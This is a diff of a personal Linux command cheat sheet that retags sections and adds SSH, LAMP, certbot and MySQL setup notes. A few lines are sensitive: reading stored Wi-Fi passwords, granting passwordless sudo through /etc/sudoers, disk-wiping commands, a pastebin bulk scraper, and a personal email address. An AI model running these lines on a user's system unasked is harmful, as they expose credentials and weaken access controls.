-## ploterific is a command line program meant for a quick and easy way to plot tabular data from the command line.
+## files. ploterific is a command line program meant for a quick and easy way to plot tabular data from the command line.
 $> firefox https://github.com/GregorySchwartz/ploterific
-## Lightning fast Linux init
+## os. Lightning fast Linux init
 $> firefox https://github.com/Sweets/hummingbird/
 ##==========================================
-## Replacement of reserved charactors in html URLs
+## web. html. Replacement of reserved charactors in html URLs
 << comment3
 #Character   Percent encoding
 $>    blank space   %20
@@ -10277,23 +9672,23 @@ $>    ?             %3F
 $>    \             %5C
 comment3
 ##==========================================
-## youtube-dl gui
+## gui. youtube-dl gui
 $> sudo add-apt-repository ppa:mordec13/youtubedl-gui
 $> sudo apt-get update && sudo apt-get install youtubedl-gui
 ##==========================================
-## Sublime text editor
+## text. app. Sublime text editor
 ## Sublime Text is a proprietary cross-platform source code editor with a Python application programming interface. It natively supports many programming languages and markup languages, and functions can be added by users with plugins, typically community-built and maintained under free-software licenses.
 $> wget -qO - https://download.sublimetext.com/sublimehq-pub.gpg | sudo apt-key add -
 $> echo "deb https://download.sublimetext.com/ apt/stable/" | sudo tee /etc/apt/sources.list.d/sublime-text.list
 $> sudo apt-get update
 $> sudo apt-get install sublime-text
 ##==========================================
-## macos-big-sur
+## os. macos-big-sur
 $> firefox https://apps.apple.com/us/app/macos-big-sur/id1526878132?mt=12%3Fmt%3D12
 $> firefox https://macdaddy.io/install-disk-creator/
 $> firefox https://www.macworld.com/article/234409/how-to-create-a-bootable-macos-big-sur-installer-drive.html
 ##==========================================
-## onedrive
+## cloud. onedrive
 $> firefox https://www.linuxuprising.com/2020/02/how-to-keep-onedrive-in-sync-with.html
 $> sudo add-apt-repository ppa:yann1ck/onedrive
 $> sudo apt-get update
@@ -10302,10 +9697,26 @@ $> onedrive
 $> onedrive --synchronize --verbose --dry-run
 $> onedrive --synchronize
 ##==========================================
-$> firefox https://github.com/fangfufu/Linux-Fake-Background-Webcam
-##==========================================
-## make iso image
+## os. iso. make iso image
 $> mkisofs -o movies.iso /home/username/folder-name
+##-------------------------------
+## os. iso. Pack the ISO.
+xorriso -as mkisofs -r \
+  -V 'Ubuntu 22.04 LTS AUTO (EFIBIOS)' \
+  -o ../ubuntu-22.04-autoinstall.iso \
+  --grub2-mbr ../BOOT/1-Boot-NoEmul.img \
+  -partition_offset 16 \
+  --mbr-force-bootable \
+  -append_partition 2 28732ac11ff8d211ba4b00a0c93ec93b ../BOOT/2-Boot-NoEmul.img \
+  -appended_part_as_gpt \
+  -iso_mbr_part_type a2a0d0ebe5b9334487c068b6b72699c7 \
+  -c '/boot.catalog' \
+  -b '/boot/grub/i386-pc/eltorito.img' \
+    -no-emul-boot -boot-load-size 4 -boot-info-table --grub2-boot-info \
+  -eltorito-alt-boot \
+  -e '--interval:appended_partition_2:::' \
+  -no-emul-boot \
+  .
 ##==========================================
 ## Compare hex dumps
 $> diff <(xxd file1) <(xxd file2)
@@ -10326,61 +9737,61 @@ $> openssl x509 -in cert.pem -fingerprint -noout
 ## Get newest kernel version by parsing the most bleeding-edge Makefile possible. Useful for doing things like writing live ebuilds and/or self-updating PKGBUILDs for testing purposes. Breakdown: * wget -qO - https://raw.githubusercontent.com/torvalds/linux/master/Makefile — retrieve Makefile and pipe to stdout * head -n5 — only the first 5 lines are relevant, thats where all the version variables are grep -E '\ \=\ [0-9]{1,}' — version variables always have an equals sign followed by a number * cut -d' ' -f3 — extract the individual numbers from the version variables * tr '\n' '.' — replace newlines with periods * sed -e "s/\.$//" — remove trailing period Show Sample Output
 $> wget -qO - https://raw.githubusercontent.com/torvalds/linux/master/Makefile | head -n5 | grep -E '\ \=\ [0-9]{1,}' | cut -d' ' -f3 | tr '\n' '.' | sed -e "s/\.$//"
 ##==========================================
-## Run entire shell script as root
+## shell. permissions. Run entire shell script as root
 ## Placing sudo in the shebang line of a shell script runs the entire thing as root.
 $> echo '#!/usr/bin/sudo /bin/bash' > script.sh
 ##------------------------------------------
-## Run entire shell script as root
-## Placing sudo in the shebang line of a shell script runs the entire thing as root.
+## shell. permissions. Run entire shell script as root
+## shell. permissions. Placing sudo in the shebang line of a shell script runs the entire thing as root.
 $> sed "1i\
 $> #!/usr/bin/sudo /bin/bash" file_name.sh > new_filename.sh
 ##==========================================
-## Save a copy of all debian packages in the form in which they are installed and configured on your system
+## os. app. package. Save a copy of all debian packages in the form in which they are installed and configured on your system
 ## A copy of all installed debian packages on your system will be put back together, with all changes in configuration files you made and placed in the current directory. Make sure you have enough disk space (say 2-3 GB). Break any time with Ctrl+C. Show Sample Output
 $> for a in $(sudo dpkg --get-selections|cut -f1); do dpkg-repack $a|awk '{if (system("sleep .5 && exit 2") != 2) exit; print}';done
 ##==========================================
-## Code to check if a module is used in python code
+## files. python. Code to check if a module is used in python code
 $> find . -name "*.ipynb" -exec grep -l "symspellpy" {} \;
 ##==========================================
-## Individually 7zip all files in current directory
+## files. Individually 7zip all files in current directory
 $> for i in *.*; do 7z a "$i".7z "$i"; done
 ##==========================================
-## Moving large number of files
+## files. Moving large number of files
 ## if you want to move with command mv large list of files than you would get following error /bin/mv: Argument list too long alternavite with exec: find /source/directory -mindepth 1 -maxdepth 1 -name '*' -exec mv {} /target/directory \; Show Sample Output
 $> find /source/directory -mindepth 1 -maxdepth 1 -name '*' -print0 | xargs -0 mv -t /target/directory;
 ##==========================================
-## Rename all subtitles files with the same name of mp4 files in same folder
+## multimedia. video. Rename all subtitles files with the same name of mp4 files in same folder
 ## Use this command if you want to rename all subtitles for them to have the same name as the mp4 files. NOTE: The order of "ls -1 *.mp4" must match the order of "ls -1 *.srt", run the command bellow to make sure the *.srt files will really match the movies after run this command: paste -d:
 $> paste -d: <(ls -1 *.mp4) <(ls -1 *.srt) | while read line; do movie="${line%%:*}"; subtitle="${line##*:}"; mv "${subtitle}" "${movie%.*}.srt"; done
 ##==========================================
-## tree command limit depth for recursive directory list
+## os. files. tree command limit depth for recursive directory list
 ## sometimes I need list from path with max limit for recursive depth directory listing
 $> tree -L 2 -u -g -p -d
 ##==========================================
-## Find out how much ram memory has your video (graphic) card
+## hardware. os. info. Find out how much ram memory has your video (graphic) card
 $> glxinfo |grep -i -o 'device|memory\|[0-9]\{1,12\} MB'|head -n 1
 ##==========================================
-## List all accessed configuration files while executing a program in linux terminal (improved version)
+## os. files. List all accessed configuration files while executing a program in linux terminal (improved version)
 ## Last listed files presumably have higher precedency then files listed first, i.e. configuration files in the personal .config directory will be listed last and their config parameters will be more authoritative then default config parameters defined in /etc directory which are usually listed above them. If you replace ".conf" with ".ini" in the command, initial files will be listed instead of config files. If you do not like to list multiple access to the same config file, pipe to "uniq" or "uniq -c" to prefix lines by the number of occurrences Show Sample Output
 $> strace 2>&1 <any_executable> |egrep -o "\".*\.conf\""
 ##==========================================
-## Boooted as EFI/UEFI or BIOS
+## os. Boooted as EFI/UEFI or BIOS
 $> [[ -d "/sys/firmware/efi" ]] && echo "UEFI" || echo "BIOS"
 ##==========================================
-## Delete all local git branches that have been merged and deleted from remote
+## git. Delete all local git branches that have been merged and deleted from remote
 $> git branch -d $( git branch -vv | grep '\[[^:]\+: gone\]' | awk '{print $1}' | xargs )
 ##==========================================
-## Get all upgradable deb packages in a single line
+## os. packagemanager. Get all upgradable deb packages in a single line
 ## Works for debian and ubuntu based distros. Show Sample Output
 $> apt list --upgradable | grep -v 'Listing...' | cut -d/ -f1 | tr '\r\n' ' ' | sed '$s/ $/\n/'
 ##==========================================
-## Get info about a gui window
+## os. gui. Get info about a gui window
 $> xwininfo
 ## Make window transparent (50% opacity) in Gnome shell
 ## Click window to change its opacity. Source: https://unix.stackexchange.com/a/494289
 $> xprop -format _NET_WM_WINDOW_OPACITY 32c -set _NET_WM_WINDOW_OPACITY 0x7FFFFFFF
 ##------------------------------------------
-## Make window transparent (50% opacity) in Gnome shell
+## os. gui. Make window transparent (50% opacity) in Gnome shell
 ##     0x7FFFFFFF - 50% opacity
 ##     0xFFFFFFFF - 100% opacity
 ## Click window to change its opacity. Source: https://unix.stackexchange.com/a/494289
@@ -10388,113 +9799,116 @@ $> xprop -format _NET_WM_WINDOW_OPACITY 32c -set _NET_WM_WINDOW_OPACITY 0x7FFFFF
 ## Set opacity via providing window id (obtained from xwininfo):
 $> xprop -id 0x3a00006 -format _NET_WM_WINDOW_OPACITY 32c -set _NET_WM_WINDOW_OPACITY 0x7FFFFFFF
 ##==========================================
-## Countdown Clock
+## shell. Countdown Clock
 ## I find the other timers are inaccurate. It takes some microseconds to perform the date function. Therefore, using date/time math to calculate the time for us results in millisecond accuracy. This is tailored to the BusyBox date function. May need to change things around for GNU date function. Show Sample Output
 $> let T=$(date +%s)+3*60;while [ $(date +%s) -le $T ]; do let i=$T-$(date +%s); echo -ne "\r$(date -d"0:0:$i" +%H:%M:%S)"; sleep 0.3; done
 ##==========================================
-## Write a bootable Linux .iso file directly to a USB-stick
+## os. Write a bootable Linux .iso file directly to a USB-stick
 ## Writes hybrid ISO directly to USB stick; replace /dev/sdb with USB device in question and the ISO image link with the link of your choice
 $> wget -O /dev/sdb https://cdimage.ubuntu.com/daily-live/current/eoan-desktop-amd64.iso
 ##==========================================
-## Check difference between two file directories recursively
+## files. Check difference between two file directories recursively
 $> diff <(tree /dir/one) <(tree /dir/two)
 ##==========================================
-## Rotate a video file by 90 degrees CW
+## multimedia. video. Rotate a video file by 90 degrees CW
 ## Change video orientation in metadata only
 $> ffmpeg -i in.mov -c copy -metadata:s:v:0 rotate=90 out.mov
 ## Rotate a video file by 90 degrees CW
 ## Transpose parameter: 0 = 90CounterCLockwise and Vertical Flip (default) 1 = 90Clockwise 2 = 90CounterClockwise 3 = 90Clockwise and Vertical Flip
 $> ffmpeg -i in.mov -vf "transpose=1" out.mov
 ##==========================================
-## SSH connection through host in the middle
+## networking. ssh. SSH connection through host in the middle
 $> ssh -J user@reachable_host user@unreacheable_host
 ##==========================================
-## Using a single sudo to run multiple && arguments
+## os. shell. permissions. Using a single sudo to run multiple && arguments
 ## Bash here string
 $> sudo -s <<< 'apt update -y && apt upgrade -y'
 ##==========================================
-## bash test check validate if variable is number
+## os. shell. bash test check validate if variable is number
 ## to test check if given variable is a digit / number Show Sample Output
 $> varNUM=12345; re='^[0-9]+$'; if ! [[ $varNUM =~ $re ]] ; then echo "error: Not a number"; fi
 ##==========================================
-## iso to USB with dd and show progress status
+## os. iso. iso to USB with dd and show progress status
 ## Does the same but shows nicely progress in real time with correct Size in %. But also needs the packages sudo,dd,pv and dialog.
 $> image="file.iso";drive="/dev/null";sudo -- sh -c 'cat '"${image}"'|(pv -n -s $(stat --printf="%s" '"${image}"')|dd of='"${drive}"' obs=1M oflag=direct) 2>&1| dialog --gauge "Writing Image '"${image}"' to Drive '"${drive}"'" 10 70 7'
 ##==========================================
-## Trim disk image for best compression before distributing
+## os hardware. Trim disk image for best compression before distributing
 ## fstrim is usually used on SSDs but can also be used to remove useless bits from file system images. This is most helpful if the compressed disk image is intended to be distributed, since it will be smaller than an untrimmed compressed image. Show Sample Output
 $> kpartx -av disk.img && mkdir disk && mount /dev/mapper/loop0p1 disk && fstrim -v disk && umount disk && kpartx -d disk.img
 ##==========================================
-## Visual alert with keyboard LEDs
+## os. hardware. Visual alert with keyboard LEDs
 $> for a in $(seq 16); do xdotool key Num_Lock;sleep .5; xdotool key Caps_Lock;done
 ##==========================================
-## draw line separator (using knoppix5 idea)
+## files. draw line separator (using knoppix5 idea)
 ## No need to fork off a process.
 $> printf "%.s*" {1..40}; printf "\n"
 ##==========================================
-## Listing today’s files only
+## files. shell. Listing today’s files only
 $> find directory_path -maxdepth 1 -daystart -mtime -1
 ## or
 $> ls -al --time-style=+%D| grep `date +%D`
 ##==========================================
-## find all files that have 20 or more MB on every filesystem, change the size and filesystem to your liking
+## files. find all files that have 20 or more MB on every filesystem, change the size and filesystem to your liking
 $> find / -type f -size +20000k -exec ls -lh {} \; 2> /dev/null | awk '{ print $NF ": " $5 }' | sort -nrk 2,2
 ##==========================================
-## List wifi passwords that has been stored as plain text in NetworkManager
+## networking.  wifi. List wifi passwords that has been stored as plain text in NetworkManager
 $> sudo grep -H '^psk=' /etc/NetworkManager/system-connections/*
 ##==========================================
-## Factory reset your harddrive. (BE CAREFUL!)
+## hardware. Factory reset your harddrive. (BE CAREFUL!)
 $> hdparm --yes-i-know-what-i-am-doing --dco-restore /dev/sdX
 ##==========================================
-## extract column from csv file
+## files. extract column from csv file
 $> cut -d"," -f9
 ##==========================================
-## colorize sequences numbers
+## files. shell. colorize sequences numbers
 ## Credits go to Flatcap https://www.commandlinefu.com/commands/by/flatcap
 $> echo abcd89efghij340.20kl|grep --color -e "[0-9]\+" -e "$"
 ##==========================================
-## rough estimate about how much disk space is used by all the currently installed debian packages
+## hardware. info. packagemanager. rough estimate about how much disk space is used by all the currently installed debian packages
 ## The vaule is expressed in megabytes Show Sample Output
 $> echo $[ ($(dpkg-query -s $(dpkg --get-selections | grep -oP '^.*(?=\binstall)') | grep -oP '(?<=Installed-Size: )\d+' | tr '\n' '+' | sed 's/+$//')) / 1024 ]
 ##==========================================
-## get the full description of a randomly selected package from the list of installed packages on a debian system
-## I put this command on my ~/.bashrc in order to learn something new about installed packages on my Debian/Ubuntu system each time I open a new terminal Show Sample Output
+## info. packagemanager. get the full description of a randomly selected package from the list of installed packages on a debian system
+## Put this command on my ~/.bashrc in order to learn something new about installed packages on my Debian/Ubuntu system each time I open a new terminal Show Sample Output
 $> dpkg-query --status $(dpkg --get-selections | awk '{print NR,$1}' | grep -oP "^$( echo $[ ( ${RANDOM} % $(dpkg --get-selections| wc -l) + 1 ) ] ) \K.*")
 ##==========================================
-## Download all recently uploaded pastes on pastebin.com
+## web. files. html. Download all recently uploaded pastes on pastebin.com
 $> elinks -dump https://pastebin.com/archive|grep https|cut -c 7-|sed 's/com/com\/raw/g'|awk 'length($0)>32 && length($0)<35'|grep -v 'messages\|settings\|languages\|archive\|facebook\|scraping'|xargs wget
 ##==========================================
-## Remove scripts tags from *.html and *.htm files under the current directory
+## web. files. html. Remove scripts tags from *.html and *.htm files under the current directory
 $> find ./ -type f \( -iname '*.html' -or -iname '*.htm' \) -exec sed -i '/<script/,/<\/script>/d' '{}' \;
 ##==========================================
-## Listen YouTube radios streaming
+## multimedia. web. Listen YouTube radios streaming
 ## Listen YouTube radios streaming. I use it on an alias to easily enter kinda flow state for study/programming. Show Sample Output
 $> streamlink --player="cvlc --no-video" "https://www.youtube.com/freecodecamp/live" 144p | & tee /dev/null
 ##==========================================
-## Network Discover in a one liner
+## networking. Network Discover in a one liner
 $> nmap -sn 192.168.1.0/24 -oG - | awk '$4=="Status:" && $5=="Up" {print $0}'|column -t
 ##==========================================
-## SSH Copy ed25519 key into your host
+## ssh. keys. SSH Copy ed25519 key into your host
 $> ssh-copy-id -i your-ed25519-key user@host
 ##==========================================
-## //Youtube URL
+## web. Youtube URL
 $> /\s*[a-zA-Z\/\/:\.]*youtu(be.com\/watch\?v=|.be\/)([a-zA-Z0-9\-_]+)([a-zA-Z0-9\/\*\-\_\?\&\;\%\=\.]*)/i
 ##==========================================
-##
+## multimedia. Play file in mpv.
 $> ffmpeg -i file.png -pix_fmt rgb24 -f rawvideo - | mpv -
 ##==========================================
 ## https://www.tutorialspoint.com/unix_commands/jpegtran.htm
-## Recursively run all jpg files through jpegtran, losslessly reducing file size by ~10% on average. Change -P2 to however many threads you want to run.
+## multimedia. image. Recursively run all jpg files through jpegtran, losslessly reducing file size by ~10% on average. Change -P2 to however many threads you want to run.
 $> find ~/pictures -type f \( -iname "*.jpg" -o -iname "*.jpeg" \) -print0 | xargs -t -P2 -0 -I filename jpegtran -optimize -progressive -copy all -outfile filename filename
 ##==========================================
-## allows you to run any command without having to sudo
+## os. permissions. allows you to run any command without having to sudo
 $> sudo sh -c "echo '$(id -un) ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers"
-
 ##==========================================
-## appimage is a standalone package format "one app = one file"
+## app. appimage is a standalone package format "one app = one file"
 $> https://appimage.github.io/
 ##==========================================
-## Vagrant
+## #################################
+## ##    Vagrant
+## #################################
+## os. vm. Vagrant
+## Use vagrant to test ansible
 ## Install virtualbox, vagrant, and ansible
 ## OSX
 $> brew cask install virtualbox vagrant
@@ -10556,13 +9970,12 @@ $> vagrant destroy
 ## Or
 $> vagrant -f destroy
 ##==========================================
-## Use vagrant to test ansible
 ##==========================================
-## Download Large Google Drive files with Wget in Terminal
+## web. files. Download Large Google Drive files with Wget in Terminal
 ## Replace FILEID and FILENAME in the command below:
 $> wget --load-cookies /tmp/cookies.txt "https://docs.google.com/uc?export=download&confirm=$(wget --quiet --save-cookies /tmp/cookies.txt --keep-session-cookies --no-check-certificate 'https://docs.google.com/uc?export=download&id=FILEID' -O- | sed -rn 's/.*confirm=([0-9A-Za-z_]+).*/\1\n/p')&id=FILEID" -O FILENAME && rm -rf /tmp/cookies.txt
 ##==========================================
-## use ffmpeg to record a smooth, reasonably sized screencast:
+## multimedia. use ffmpeg to record a smooth, reasonably sized screencast:
 $> screenRecord.sh ~/demo.mkv
 $> cat > Vagrantfile << EOF
 #! /bin/bash
@@ -10576,11 +9989,11 @@ EOF
 $> ffmpeg -hide_banner -loglevel error -f x11grab -video_size 1920x1080 -framerate 30 -i :0 -vcodec libx264 -preset ultrafast -qp 0 -pix_fmt yuv444p $1
 
 ##==========================================
-## jq is insane
+## files. jq is insane
 $> yt-dlp -J URL >> playlist.json
 $> perl -Mdd -MJSON::XS -E '$json=decode_json(do{local $/; <>}); say join "\n", map { $_->[0] } sort { $a->[1] <=> $b->[1] } map { [$_->{playlist_autonumber}." ".$_->{title}, $_->{upload_date} ] } $json->{entries}->@*' playlist.json
 ##==========================================
-## use zfs to encrypt.
+## files. encryption. use zfs to encrypt.
 ## create a dataset called "tank" for /dev/sdb
 $> zpool create tank sdb
 ## create a key
@@ -10598,13 +10011,14 @@ $> zfs get mountpoint
 $> zfs list
 $> zpool status
 ##==========================================
-## 2 minutes of 30fps video (3,600 frames), gop set to 30*30 (each 30 seconds), you can see the video change slightly at each 30 second mark (new i-frame), but otherwise its perfectly still
+## multimedia. video. 2 minutes of 30fps video (3,600 frames), gop set to 30*30 (each 30 seconds), you can see the video change slightly at each 30 second mark (new i-frame), but otherwise its perfectly still
 $> ffmpeg -loop 1 -r 30 -i b10cac207d27ccaf0a2a4d25803c5626.jpg -t 120 -map 0:v:0 -threads 0 -cpu-used 1 -g "30*30" -c:v libvpx -b:v 2M -crf 35 -qmin 25 -qmax 63 -y /tmp/a.webm
 ##==========================================
 ## ###############################################
 ## ##    tmux Sessions
 ## ###############################################
 ## -------------------------------------
+## shell. multiplex. tmux Sessions
 ## Misc
 $> Ctrl + b :                         ## enter command mode
 $>    : set -g OPTION                 ## set OPTION for all sessions
@@ -10710,23 +10124,23 @@ $>    : delete-buffer -b 1            ## delete buffer_1
 ## ###############################################
 ## ###############################################
 ##==========================================
-## minimize button
+## gui. minimize button
 ## for the icons on the right side
 $> gsettings set org.gnome.desktop.wm.preferences button-layout ":minimize,maximize,close"
 ## for the icons on the left side
 $> gsettings set org.gnome.desktop.wm.preferences button-layout "close,minimize,maximize:"
-## install and aсtivate a clean copy of Windows on any PC.
+##==========================================
+## os. web. install and aсtivate a clean copy of Windows on any PC.
 $> firefox https://rentry.org/installwindows
 ##==========================================
 ## Static linked-terminal editor
 $> firefox
 ##==========================================
-## mac pci video cam
-## As at 8/3/2020 follow the instructions Here. 
-## They come in two parts, make sure you also follow the ones for your platform. 
+## os. multimedia. mac pci video cam
+## As at 8/3/2020 follow the instructions Here.
+## They come in two parts, make sure you also follow the ones for your platform.
 ## They are a bit jumbled on the site so I have included them below.
-
-## I'm running 18.04 LTS (Bionic) on a 2013 Macbook Pro. The instructions that worked for me were as follows:
+## Running 18.04 LTS (Bionic) on a 2013 Macbook Pro. The instructions that worked for me were as follows:
 $> sudo apt-get install git
 $> sudo apt-get install curl xzcat cpio
 $> git clone https://github.com/patjak/facetimehd-firmware.git
@@ -10749,28 +10163,21 @@ $> sudo nano /etc/modules
 
 ## I had to install xz-utils instead of xzcat as the latter was not found
 ##==========================================
-## transfer the data to multiple destinations with the rsync command using a foe statement.
+## files. sync. transfer the data to multiple destinations with the rsync command using a foe statement.
 $> for d in /DESTINATION/PATH_1 /DESTINATION/PATH_2
 $> do rsync -options /SOURCE/PATH $d
 $> done
 
 ##==========================================
 ## Printing
-
 $> lp -d HP-LaserJet-3050 -n 2 -o Duplex=None -o fit-to-page -o MediaType=stationery-heavyweight -o Quality=High -o PageSize=Custom.4x6in file.pdf
 ##==========================================
-## Control android
+## os. android. Control android
 $> firefox https://github.com/Genymobile/scrcpy
 ##==========================================
 ## 3D printing
 
 ##==========================================
-## Laser exhaust
-## Fan
-https://www.amazon.com/HiCFM-Velocity-Powerful-Commercial-Industrial/dp/B0BBM3BH31/
-## Hepa
-
-
 
 
 
@@ -10783,7 +10190,7 @@ https://www.amazon.com/HiCFM-Velocity-Powerful-Commercial-Industrial/dp/B0BBM3BH
 ## #################################
 ## ##    Docker
 ## #################################
-## Add Docker's official GPG key:
+## os. docker. Add Docker's official GPG key:
 $> sudo apt-get update
 $> sudo apt-get install ca-certificates curl
 $> sudo install -m 0755 -d /etc/apt/keyrings
@@ -10807,7 +10214,7 @@ $> sudo tar Cxzvvf /usr/local nerdctl-full-2.0.2-linux-amd64.tar.gz
 $> sudo docker save hello-world2:latest > hello-world2.tar
 ## Then you import that with containerd so it can be used in the cluster
 $> sudo ctr -n k8s.io image import hello-world2.tar
-## 
+##
 $> sudo ctr namespaces ls
 $> sudo ctr -n k8s.io images list
 $> sudo ctr -n k8s.io containers list
@@ -10818,20 +10225,626 @@ $> sudo nerdctl --namespace k8s.io build --tag hello-world2:latest .
 $> kubectl run nginx-check --image-pull-policy=Never --image=hello-world2:latest
 
 ##========================================
+## ##########################################################
+## ##    Sound
+## ##########################################################
+## multimedia. sound.
+##==========================================
+## multimedia. sound. Stream audio across two pairs of bluetooth headphones linux
+## Install paprefs
+$> sudo apt-get install paprefs
+## Pair both sets of headphones with your computer.
+## Launch paprefs
+$> paprefs
+## Create simultaneous output:
+## In the paprefs window, select the "Simultaneous Output"
+## tab and check the boxes for both of your Bluetooth headphones
+##========================================
+
+
+##==========================================
+## ##########################################################
+## ##    END Sound
+## ##########################################################
+## ######################################################
 
 
 ##==========================================
 
-
+## ##########################################################
+## ##    Packages
+## ##########################################################
+## Working with apps and platforms.
+## LAMP apache mysql php wordpress nexcloud
 ##==========================================
-
-
+## ###################################
+## ##    LAMP apache mysql php
+## ###################################
 ##==========================================
-
-
+### ssh secure shell remote
+## Install ssh server and client
+$> sudo apt-get install openssh-server openssh-sftp-server openssh-client sshfs
+## Login to server, the server will ask for a password
+$> ssh $USER@server
+## Use -t to call a shell and cd to a particular directory
+$> ssh -t example.com "cd /foo/bar; exec \$SHELL -l"
+## Setup server
+## If you have a complelling reason chamge port from port 22 to something else.
+## Check current port
+$> cat /etc/ssh/sshd_config | grep -i Port
+## Change port to 26
+$> sudo sed -i "s/Port 22/Port 26/"
+## Login to server at port 26
+$> ssh user@192.168.1.1 -p 26
+##------------------------------------------
+## Use openssl aes rsa encryption keys to connect securely to server
+## Create keys. public keys to put on remote machines which will use that key to authenticate, and a private key you set strong permissions on, that you use to give you access to the remote.
+$> ssh-keygen -t rsa
+##   Generating public/private rsa key pair.
+##   Enter file in which to save the key (/Your/HomeDir/.ssh/id_rsa):
+##   Enter passphrase (empty for no passphrase):
+## defaults to 2048 bits, can change to higher bits with -b 4096, and -C and put in a comment
+$> ssh-keygen -t rsa -b 4096 -C 'Passwd_hint'
+## Available encryption; “dsa”, “ecdsa”, “ed25519”, “rsa”. Change the key names appropriately.
+$> ssh-keygen -t dsa
+## This will place the private key in ~/.ssh/id_rsa and the public key in ~/.ssh/id_rsa.pub.
+## Set permissions
+$> chmod 700 ~/.ssh
+$> chmod 600 ~/.ssh/id_rsa; chmod 600 ~/.ssh/id_rsa.pub
+## Do this for each
+$> mv ~/.ssh/id_rsa  ~/.ssh/servername_id_rsa; mv ~/.ssh/id_rsa.pub  ~/.ssh/servername_id_rsa.pub;
+##------------------------------------------
+### Setup on server !!!! Do not copy your private key over. !!!!
+## Transfer pub key to server:
+$> scp ~/.ssh/id_rsa.pub user@myserver.com:~/id_rsa.pub
+## in the server, add pub key to authorized_keys file
+$> cat id_rsa.pub >> ~/.ssh/authorized_keys
+## Or
+## append the contents of ~/.ssh/id_dsa.pub to the end of ~/.ssh/authorized_keys on the remote machine.
+$> cat .ssh/serername_id_rsa.pub | ssh $USER@192.168.1.101 'cat >> ~/.ssh/authorized_keys'
+## Or
+## Can use ssh-copy-id instead; the cat port technique above is more portable.
+$> ssh-copy-id
+## !!!! Do not copy your private key over. !!!!Z
 ##==========================================
+## Install LAMP Web Server
+#$> sudo apt-get install apache2 mysql-server mysql-client php5 libapache2-mod-php5 php5-cli php5-gd
+## Install newer LAMP Web Server implementation with php7.0
+#$> sudo apt-get install apache2 mysql-server mysql-client php7.0 libapache2-mod-php7.0 php7.0-cli php7.0-gd libapache2-mod-php7.0 php7.0-mysql
+## Install newer LAMP Web Server implementation
+$> sudo apt install apache2 ghostscript libapache2-mod-php mysql-server php php-bcmath php-curl php-imagick php-intl php-json php-mbstring php-mysql php-xml php-zip
+## Mysql should prompt to choose a root password
+## Restart apache2
+$> sudo /etc/init.d/apache2 restart
+## or
+$> sudo sevice apache restart
+## Add permissions allow user to make content on /var/www
+$> sudo usermod -a -G www-data $USER
+$> sudo chown -R :www-data /var/www
+$> sudo chmod -R 775 /var/www
+##------------------------------------------
+## Activate Mod_Rewrites to rewrite links in apache
+## Allow apache2 to change addresses to new URLs
+## Before we begin generating the actual URL rewrites, activate the apache mod_rewrite module.
+## Add apache2 module to allow rewrites
+$> sudo a2enmod rewrite
+## Change apache2 configuration to allow rewrites
+## Use sed to change "AllowOverride None" to "AllowOverride All" in the "<Directory /var/www/>" section of /etc/apache2/apache2.conf
+$> sudo sed -i '\%^<Directory /var/www/>%,\%^</Directory>% s/AllowOverride None/AllowOverride All/' /etc/apache2/apache2.conf
+## OR use a text editor
+$> sudo mcedit /etc/apache2/apache2.conf
+## Change this:
+$@<Directory /var/www/>
+$@  Options Indexes FollowSymLinks
+$@  AllowOverride None
+$@  Require all granted
+$@</Directory>
+## To this:
+$@<Directory /var/www/>
+$@  Options Indexes FollowSymLinks
+$@  AllowOverride All
+$@  Require all granted
+$@</Directory>
+## Restart apache
+$> sudo service apache2 restart
+##------------------------------------------
+## Apache has userdir module userdir which lets you use /home/USER/public_html as root directory.
+## You will access this public_html as localhost/~USER/
+## Make a public html directory in home dir
+$> mkdir ~/public_html
+## Set permissions on public_html folder allow the www-data user to see the files usually 755
+$> chmod -R 755 ~/public_html
+## Enable the userdir apache mod
+$> sudo a2enmod userdir
+$> sudo service apache2 reload
+$> w3m -dump https://httpd.apache.org/docs/2.4/howto/public_html.html
+## ?????uncomment line below in the config file conf/httpd.conf, and adapting the httpd-userdir.conf file as necessary
+## #Include conf/extra/httpd-userdir.conf
+##=======================================
+## SSL LetsEncrypt is a project designed to allow users access to free SSL certificates for their websites.
+## https://linuxconfig.org/generate-ssl-certificates-with-letsencrypt-debian-linux
+$> sudo apt-get install python-certbot-apache
+## Certbot PPA
+## https://certbot.eff.org/lets-encrypt/ubuntuxenial-apache
+$> sudo apt-get update
+$> sudo apt-get install software-properties-common
+$> sudo add-apt-repository universe
+$> sudo add-apt-repository ppa:certbot/certbot
+$> sudo apt-get update
+$> sudo apt-get install certbot python-certbot-apache
+$> sudo certbot --apache certonly
+#Enter email address (used for urgent renewal and security notices) (Enter 'c' tocancel): sflaptop@gmail.com
+#Starting new HTTPS connection (1): acme-v02.api.letsencrypt.org
+#Please read the Terms of Service at
+#https://letsencrypt.org/documents/LE-SA-v1.2-November-15-2017.pdf. You must agree in order to register with the ACME server at
+#https://acme-v02.api.letsencrypt.org/directory
+## Or
+$> wget https://dl.eff.org/certbot-auto
+$> sudo mv certbot-auto /usr/bin
+$> sudo certbot --apache
+## Auto-Renew with Cron
+## Create script to renew certs
+$> sudo echo '
+##! /bin/bash
+#certbot renew -q' > /home/user/renew-certs.sh
+## Make the script executable
+$> chmod +x renew-certs.sh
+$> crontab -l
+## create a cron job that runs twice a day
+$> echo 'echo 'echo '* 3,15 * * * /home/$USER/renew-certs.sh' >> /home/$USER/.crontab
+## Add jobs to cron
+$> crontab < .crontab
+$> crontab -l
+##=========================================
+## Configure mysql from commandline
+$> mysql -u root -p -e "CREATE USER 'your_username_here'@'localhost' IDENTIFIED BY 'newpassword'; CREATE DATABASE database_name; GRANT ALL PRIVILEGES ON database_name.* TO new_db_user@localhost IDENTIFIED BY 'new_db_user_pass';"
+## Function to setup mysql for wordpress
+## Setup mysql for wordpress. Usage: wordpressmysqlsetup $USER password wp_databasename
+$> function mysqlsetup() { mysql -u root -p -e "CREATE USER '$1'@'localhost' IDENTIFIED BY '$2'; CREATE DATABASE $3; GRANT ALL PRIVILEGES ON $3.* TO $1@localhost IDENTIFIED BY '$2'; SHOW DATABASES;" ; }
+##-----------------------------------------
+## Configure mysql manually
+$> gksudo gedit /etc/mysql/my.cnf
+## Insecure way, put password in command
+$> sudo /usr/bin/mysqladmin -u root -h localhost password 'RootPassword'
+$> sudo /usr/bin/mysqladmin -u YOURUSERNAME -h localhost password 'YourPassword'
+$> sudo /usr/bin/mysqladmin -u YOURUSERNAME -h 127.0.0.1 password 'YourPassword'
+$> sudo /usr/bin/mysqladmin -u root -h localhost password 'new-password'
+$> sudo /etc/init.d/mysql restart
+## In AWS can sign on with sudo
+$> sudo msql
+## Sign into mysql
+$> mysql -u root -h localhost -p
